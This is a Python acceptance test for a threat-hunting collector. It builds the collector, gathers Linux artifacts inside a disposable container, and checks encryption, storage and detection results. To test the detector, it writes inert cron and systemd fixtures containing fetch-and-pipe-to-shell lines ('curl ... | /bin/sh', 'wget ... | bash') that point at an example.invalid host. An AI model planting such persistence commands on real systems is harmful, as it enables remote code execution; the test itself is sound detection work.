"""Real packaged-executable Linux acceptance, not host or attack acceptance.

Run only in a disposable root Docker container: --network none --read-only,
--tmpfs /tmp:rw,exec,nosuid,nodev,size=512m, and writable tmpfs mounts at
/etc/cron.d, /etc/systemd/system and /usr/sbin. Mount app/tests and the
installed engine read-only; set PYTHONDONTWRITEBYTECODE=1,
HUNTING_LINUX_ACCEPTANCE_DISPOSABLE=1 and HUNTING_VQL_ENGINE (or HUNTING_TEST_ENGINE).
No daemon is started and none of the inert fixture files is executed. All
keys, archives and SQLite indexes live in TemporaryDirectory, never app data.
"""
import datetime
import hashlib
import json
import os
from pathlib import Path
import platform
import subprocess
import tempfile
import unittest
from urllib.parse import unquote
import zipfile

from app.modules.hunting_packager import build_package
from app.modules.hunting_runtime import trusted_tools
import time
import socket
from app.modules.hunting_ingest import summarize_container
from app.modules.hunting_results import (
    analyze_result, get_result, history, read_page, save_result, verify_integrity,
)


class LinuxPackagedAcceptanceTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        engine = os.environ.get('HUNTING_VQL_ENGINE') or os.environ.get('HUNTING_TEST_ENGINE')
        if not engine or not Path(engine).is_file():
            raise unittest.SkipTest('Installed engine missing: set HUNTING_VQL_ENGINE or HUNTING_TEST_ENGINE')
        if platform.system() != 'Linux':
            raise unittest.SkipTest('Real Linux engine collection requires Linux')
        if os.environ.get('HUNTING_LINUX_ACCEPTANCE_DISPOSABLE') != '1':
            raise unittest.SkipTest('Requires explicitly opted-in disposable Docker fixture filesystem')
        if not Path('/.dockerenv').is_file() or os.geteuid() != 0:
            raise RuntimeError('E2E fixtures require a disposable root Docker container')
        # Fail closed before writing fixed paths: no host bind mounts or image
        # filesystem may be used as the fixture target.
        mounts = {line.split()[1]: line.split()[2] for line in Path('/proc/mounts').read_text().splitlines()}
        for directory in ('/etc/cron.d', '/etc/systemd/system', '/usr/sbin'):
            if mounts.get(directory) != 'tmpfs':
                raise RuntimeError('Required dedicated disposable tmpfs missing: ' + directory)
        cls.tools = trusted_tools('linux')
        if Path(engine).resolve() != cls.tools[0].resolve():
            raise RuntimeError('Test engine must equal runtime-pinned engine')

    def test_real_collection_encryption_persistence_analysis_and_evidence(self):
        marker = hashlib.sha256(b'linux-e2e-inert-fixture-not-a-malware-hash').hexdigest()
        fixture_contents = {
            '/etc/cron.d/hunting-linux-e2e': '# inert evidence marker ' + marker + '\n* * * * * root /bin/echo "curl https://example.invalid/benign | sh"\n',
            '/etc/systemd/system/hunting-linux-e2e.service':
                '# inert evidence marker ' + marker + '\n[Unit]\nDescription=Offline evidence fixture\n[Service]\nExecStart=/bin/echo "curl https://example.invalid/benign | sh"\n',
            # Literal suspicious text only. No cron/systemd daemon is running;
            # these files are never enabled, launched, sourced or shell-evaluated.
            '/etc/cron.d/hunting-linux-signal':
                '# INERT detector fixture; never execute\n* * * * * root /usr/bin/curl -fsSL https://example.invalid/acceptance | /bin/sh\n',
            '/etc/systemd/system/hunting-linux-signal.service':
                '# INERT detector fixture; never execute\n[Service]\nExecStart=/bin/sh -c "wget -q -O- https://example.invalid/acceptance | bash"\n',
            '/usr/sbin/hunting-linux-e2e-suid': 'INERT DATA ONLY; never execute\n',
        }
        for filename, content in fixture_contents.items():
            path = Path(filename)
            # Exclusive creation prevents accidentally replacing any existing file.
            with path.open('x') as stream:
                stream.write(content)
            self.addCleanup(path.unlink, missing_ok=True)
            path.chmod(0o4755 if filename.endswith('-suid') else 0o644)

        with tempfile.TemporaryDirectory(prefix='hunting-linux-acceptance-') as temp:
            root = Path(temp)
            base, keys = root / 'results', root / 'keys'
            tenant = 1
            profile = dict(id='e' * 32, platform='linux',
                           artifacts=['host', 'processes', 'network', 'linux_services', 'linux_crontab', 'linux_suid'],
                           timeout_seconds=120, event_days=7)
            # Use tenant keys generated by the app packager, not fixture certificates.
            profile['company_id'] = tenant
            profile['campaign_id'] = 'linux-packaged-acceptance'
            package, manifest = build_package(profile, keys, *self.tools)
            self.assertFalse(manifest['config_only'])
            self.assertFalse(manifest['execution_verified'])
            self.assertEqual(manifest['executable_sha256'], hashlib.sha256(package).hexdigest())
            self.assertEqual(manifest['engine_sha256'], self.tools[2])
            self.assertEqual(manifest['target_binary_sha256'], self.tools[3])
            self.assertTrue(package.startswith(b'\x7fELF'))
            executable = root / 'collector'
            executable.write_bytes(package)
            executable.chmod(0o700)
            # Default argv MUST come from repacked autoexec: no --config/direct query.
            # A harmless loopback listener makes snapshot Network non-vacuous;
            # --network none still prevents external access, no traffic is sent.
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.bind(('127.0.0.1', 0))
            listener.listen(1)
            self.addCleanup(listener.close)
            started = time.time()
            run = subprocess.run([str(executable)], cwd=root,
                                 env={'PATH': '/usr/bin:/bin', 'HOME': str(root), 'TMPDIR': str(root)},
                                 capture_output=True, text=True, timeout=150)
            self.assertEqual(run.returncode, 0, run.stderr[-6000:])
            archives = list(root.glob('BroSec-*.zip'))
            self.assertEqual(len(archives), 1, run.stderr[-6000:])
            archive = archives[0]
            with zipfile.ZipFile(archive) as outer:
                self.assertIn('metadata.json', outer.namelist())
                self.assertTrue(outer.getinfo('data.zip').flag_bits & 1)
                metadata = json.loads(outer.read('metadata.json'))
                if isinstance(metadata, list):
                    self.assertEqual(len(metadata), 1)
                    metadata = metadata[0]
                self.assertEqual(metadata['Scheme'], 'X509')
                self.assertTrue(metadata['EncryptedPass'])
                with self.assertRaises(RuntimeError):
                    outer.read('data.zip')  # No password cannot read encrypted data.

            observed = {}
            def capture(source, index, row):
                observed.setdefault(source, []).append((index, row))
            summary = summarize_container(archive, keys, tenant, row_callback=capture)
            self.assertEqual(summary['status'], 'parsed')
            self.assertEqual(summary['collector_schema'], 'brosec.result.v1')
            labels = {unquote(s['source']).rsplit('/', 1)[-1]: s for s in summary['sources']}
            self.assertEqual(set(labels), {'Host.json', 'Processes.json', 'Network.json', 'LinuxServices.json', 'LinuxCrontab.json', 'LinuxSUID.json'})
            self.assertEqual(summary['total_rows'], sum(s['rows'] for s in summary['sources']))
            for source in summary['sources']:
                rows = observed[source['source']]
                self.assertGreater(source['rows'], 0, source)
                self.assertEqual([index for index, _ in rows], list(range(source['rows'])))
                self.assertRegex(source['sha256'], '^[a-f0-9]{64}$')
                self.assertGreater(source['bytes'], 0)
                self.assertEqual(source['completeness'], 'unknown')
            host = observed[labels['Host.json']['source']][0][1]
            self.assertTrue(host.get('Hostname'))
            self.assertIn(host['Hostname'], summary['hostnames'])
            self.assertEqual(host['OS'], 'linux')
            process_rows = [row for _, row in observed[labels['Processes.json']['source']]]
            current = next(row for row in process_rows if row.get('Pid') == os.getpid())
            self.assertIn('unittest', current['CommandLine'])
            self.assertTrue(current['CreateTime'])
            # Verify actual kernel creation time, not merely a non-null projection.
            stat = Path('/proc/self/stat').read_text().rsplit(')', 1)[1].split()
            boot = next(int(l.split()[1]) for l in Path('/proc/stat').read_text().splitlines() if l.startswith('btime '))
            expected_created = boot + int(stat[19]) / os.sysconf('SC_CLK_TCK')
            created = current['CreateTime']
            parsed = datetime.datetime.fromisoformat(created.replace('Z', '+00:00')).timestamp() if isinstance(created, str) else float(created)
            self.assertAlmostEqual(parsed, expected_created, delta=2)
            self.assertLessEqual(parsed, started)
            self.assertEqual(summary['campaign_id'], profile['campaign_id'])
            network_rows = [row for _, row in observed[labels['Network.json']['source']]]
            self.assertTrue(any(row.get('Laddr', {}).get('Port') == listener.getsockname()[1] for row in network_rows), network_rows)
            for label, filename in [('LinuxServices.json', '/etc/systemd/system/hunting-linux-e2e.service'),
                                    ('LinuxCrontab.json', '/etc/cron.d/hunting-linux-e2e'),
                                    ('LinuxSUID.json', '/usr/sbin/hunting-linux-e2e-suid')]:
                rows = [row for _, row in observed[labels[label]['source']] if row.get('OSPath') == filename]
                self.assertEqual(len(rows), 1, label)
                row = rows[0]
                if label != 'LinuxSUID.json':
                    self.assertEqual(row['Content'], fixture_contents[filename])
                    self.assertFalse(row['ContentTruncated'])
                else:
                    self.assertTrue(row['Mode'].startswith('u'), row)
                    self.assertIs(type(row['OwnerID']), int)
                    self.assertIs(type(row['GroupID']), int)
                    self.assertEqual((row['OwnerID'], row['GroupID']), (0, 0))
            provenance = summary['collection_provenance']
            self.assertEqual(provenance['status'], 'endpoint_claims')
            self.assertTrue(provenance['capture_started_utc_claim'])
            self.assertFalse(provenance['event_window_applied_claim'])
            self.assertFalse(provenance['claims_verified'])
            self.assertFalse(provenance['claims_trusted'])
            requested = {s['id']: s for s in provenance['requested_sources']}
            self.assertEqual(set(requested), set(profile['artifacts']))
            for source in requested.values():
                self.assertEqual(source['observed_status'], 'present')
                self.assertEqual(source['observed_bytes_status'], 'present')
                self.assertGreater(source['observed_bytes'], 0)
                self.assertEqual(source['limit_reached'],
                                 source['observed_rows'] >= source['configured_row_limit'])
                # Host's intentional one-row cap is reached on every collection;
                # provenance conservatively calls even that possibly truncated.
                if source['id'] != 'host':
                    self.assertFalse(source['limit_reached'])

            saved = save_result(base, tenant, archive, summary)
            identifier = saved['id']
            self.assertFalse(saved['duplicate'])
            self.assertEqual(saved['sha256'], hashlib.sha256(archive.read_bytes()).hexdigest())
            self.assertEqual(saved['size'], archive.stat().st_size)
            stored = base / 'archives' / str(tenant) / (identifier + '.zip')
            self.assertEqual(stored.read_bytes(), archive.read_bytes())
            self.assertEqual(get_result(base, tenant, identifier)['summary'], summary)
            self.assertTrue(save_result(base, tenant, archive, summary)['duplicate'])
            self.assertEqual(history(base, tenant)['total'], 1)
            self.assertEqual(history(base, 2)['total'], 0)
            with self.assertRaises(ValueError):
                summarize_container(archive, keys, 2)
            self.assertIsNone(get_result(base, 2, identifier))
            integrity = verify_integrity(base, tenant)
            self.assertEqual((integrity['checked'], integrity['valid'], integrity['invalid']), (1, 1, []))
            archive.unlink()  # Every subsequent read must use the persisted encrypted copy.
            analysis = analyze_result(base, keys, tenant, identifier)
            self.assertEqual(analysis['import_id'], identifier)
            self.assertEqual(analysis['sha256'], saved['sha256'])
            # Source support is partial literal triage, not execution proof.
            linux_sources = {labels[name]['source'] for name in ('LinuxServices.json', 'LinuxCrontab.json', 'LinuxSUID.json')}
            unsupported_linux = {labels['LinuxSUID.json']['source']}
            self.assertEqual(set(analysis['unsupported_sources']), unsupported_linux)
            self.assertEqual(analysis['verdict'], 'not_determined')
            self.assertEqual(analysis['missing_sources'], [])
            coverage = {x['source']: x for x in analysis['source_coverage']}
            self.assertEqual(set(coverage), set(observed))
            for label, item in labels.items():
                self.assertEqual(coverage[item['source']]['supported'], label != 'LinuxSUID.json')
                self.assertEqual(coverage[item['source']]['rows'], item['rows'])
                if label != 'LinuxSUID.json':
                    self.assertEqual(analysis['rows_reviewed'][label[:-5]], item['rows'])
            explicit_limits = [
                'Linux analysis is literal snapshot config triage, not execution history, enablement or maliciousness attribution',
                'LinuxSUID remains unsupported for threat analysis: mode/owner presence alone is not a strong signal',
                'Linux shell analysis is a narrow invocation subset; compound scripts, substitutions, aliases, includes and environment resolution are unsupported',
                'Systemd effective configuration, drop-ins, timers, generators, dependencies and overridden vendor units are not resolved',
                'LinuxServices and LinuxCrontab support is partial: literal commands only; unsupported syntax is not a clean bill of health',
            ]
            for limitation in explicit_limits:
                self.assertIn(limitation, analysis['limitations'])
            expected_signals = [
                ('LinuxCrontab.json', '/etc/cron.d/hunting-linux-signal',
                 'persistence.linux_cron_suspicious_invocation', 2),
                ('LinuxServices.json', '/etc/systemd/system/hunting-linux-signal.service',
                 'persistence.linux_systemd_suspicious_invocation', 3),
            ]
            detected = []
            for label, filename, rule, line_number in expected_signals:
                source = labels[label]['source']
                matches = [(index, row) for index, row in observed[source] if row.get('OSPath') == filename]
                self.assertEqual(len(matches), 1)
                index, row = matches[0]
                self.assertEqual(row['Content'], fixture_contents[filename])
                self.assertFalse(row['ContentTruncated'])
                findings = [f for f in analysis['findings'] if f['source'] == source and f['row_number'] == index + 1]
                self.assertEqual(len(findings), 1)
                finding = findings[0]
                self.assertEqual(finding['rule_id'], rule)
                self.assertEqual(finding['row_offset'], index)
                self.assertEqual(finding['triage_level'], 'medium')
                self.assertEqual(finding['evidence']['OSPath'], filename)
                self.assertEqual(finding['evidence_refs'], [{'source': source, 'row_number': index + 1, 'relation': 'rule_match'}])
                config = finding['config_evidence']
                self.assertEqual(config['field'], 'Content')
                self.assertEqual(config['line_number'], line_number)
                self.assertEqual(config['line'], fixture_contents[filename].splitlines()[line_number - 1])
                self.assertEqual(config['signal'], 'download_to_shell')
                self.assertFalse(config['content_truncated'])
                self.assertFalse(config['line_excerpt_truncated'])
                evidence_row = read_page(base, keys, tenant, identifier, source, index, 1)['rows'][0]
                self.assertEqual(evidence_row, row)
                self.assertEqual(evidence_row['Content'].splitlines()[config['line_number'] - 1], config['line'])
                signal_nodes = [n for n in analysis['graph']['nodes'] if n.get('role') == 'signal' and
                                {'source': source, 'row_number': index + 1} in n.get('evidence_refs', [])]
                self.assertEqual(len(signal_nodes), 1)
                self.assertEqual(signal_nodes[0]['kind'], 'persistence')
                detected.append(finding)
            self.assertEqual(len([f for f in analysis['findings'] if f['rule_id'].startswith('persistence.linux_')]), 2)
            benign_paths = {'/etc/cron.d/hunting-linux-e2e', '/etc/systemd/system/hunting-linux-e2e.service', '/usr/sbin/hunting-linux-e2e-suid'}
            self.assertFalse(any(f['evidence'].get('OSPath') in benign_paths for f in analysis['findings']))
            self.assertTrue(analysis['triage_summary']['manual_review_required'])
            self.assertEqual(analysis['triage_summary']['correlations']['process_persistence'], 0)
            self.assertTrue(any('Host, Processes, Network, Services, Tasks' in x for x in analysis['limitations']))
            self.assertTrue(any('авторство не подтверждено' in x for x in analysis['limitations']))
            self.assertTrue(any('отсутствие угроз' in x for x in analysis['limitations']))

            # Retrieve *every* observed source through the real evidence API.
            for source in summary['sources']:
                name, count = source['source'], source['rows']
                retrieved = []
                for offset in range(0, count, 100):
                    page = read_page(base, keys, tenant, identifier, name, offset, 100)
                    self.assertEqual((page['source'], page['total'], page['offset']), (name, count, offset))
                    retrieved.extend(page['rows'])
                self.assertEqual(retrieved, [row for _, row in observed[name]])
                self.assertEqual(read_page(base, keys, tenant, identifier, name, count, 1)['rows'], [])
            # Harmless hash comments guarantee non-vacuous analyzer citations.
            # They are test markers, not threat intelligence or attack payloads.
            marker_ioc = next(ioc for ioc in analysis['iocs'] if ioc['value'] == marker)
            self.assertEqual(marker_ioc['type'], 'sha256')
            self.assertEqual({ref['source'] for ref in marker_ioc['evidence_refs']},
                             {labels['LinuxServices.json']['source'], labels['LinuxCrontab.json']['source']})
            refs = []
            def collect_refs(value):
                if isinstance(value, dict):
                    if 'evidence_refs' in value:
                        refs.extend(value['evidence_refs'])
                    for child in value.values():
                        collect_refs(child)
                elif isinstance(value, list):
                    for child in value:
                        collect_refs(child)
            collect_refs(analysis)
            self.assertGreaterEqual(len(refs), 2)
            cache = {}
            for ref in refs:
                name, number = ref['source'], ref['row_number']
                self.assertIn(name, observed)
                self.assertIs(type(number), int)
                self.assertGreaterEqual(number, 1)
                self.assertLessEqual(number, len(observed[name]))
                key = (name, number)
                if key not in cache:
                    page = read_page(base, keys, tenant, identifier, name, number - 1, 1)
                    self.assertEqual(len(page['rows']), 1)
                    cache[key] = page['rows'][0]
                self.assertEqual(cache[key], observed[name][number - 1][1])
                if ref in marker_ioc['evidence_refs']:
                    self.assertIn(marker, cache[key][ref['field']])
            with self.assertRaises(KeyError):
                analyze_result(base, keys, 2, identifier)
            with self.assertRaises(KeyError):
                read_page(base, keys, 2, identifier, labels['Host.json']['source'])
            # Mutation is confined to a temporary copy and proves integrity gates.
            stored.write_bytes(stored.read_bytes() + b'tampered')
            with self.assertRaises(ValueError):
                analyze_result(base, keys, tenant, identifier)
            with self.assertRaises(ValueError):
                read_page(base, keys, tenant, identifier, labels['Host.json']['source'])
            print('LINUX_PACKAGED_ACCEPTANCE ' + json.dumps({
                'real_engine_collection': True, 'actual_repacked_executable': True, 'collector_returncode': run.returncode, 'engine_sha256': self.tools[2], 'execution_seconds': round(time.time()-started, 2), 'host_acceptance': False, 'process_command_line_verified': True, 'process_creation_time_verified_against_proc': True, 'limitations': analysis['limitations'], 'collection_provenance': provenance, 'synthetic_attacks': False,
                'sources': {name: item['rows'] for name, item in labels.items()},
                'total_rows': summary['total_rows'], 'resolved_evidence_refs': len(refs),
                'unsupported_linux_analysis_sources': sorted(unsupported_linux), 'inert_linux_config_signals_verified': len(detected), 'benign_linux_controls_verified': True,
                'verdict': analysis['verdict'], 'ui_acceptance': False,
            }, sort_keys=True))


if __name__ == '__main__':
    unittest.main()
